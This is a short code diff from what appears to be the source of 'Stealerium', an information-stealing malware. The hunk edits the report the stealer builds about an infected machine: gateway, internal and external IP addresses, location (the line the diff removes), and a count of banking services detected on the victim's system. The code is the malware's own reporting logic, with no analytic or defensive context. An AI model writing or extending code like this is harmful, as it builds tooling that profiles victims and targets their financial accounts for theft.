@@ -194,7 +194,6 @@ namespace Stealerium
                        + "\nGateway IP: " + SystemInfo.GetDefaultGateway()
                        + "\nInternal IP: " + SystemInfo.GetLocalIp()
                        + "\nExternal IP: " + SystemInfo.GetPublicIp().Result
-                       + "\n" + SystemInfo.GetLocation()
                        + "\n"
                        + "\n💸 *Domains info:*"
                        + Counter.GetLValue("🏦 *Banking services*", Counter.DetectedBankingServices, '-')
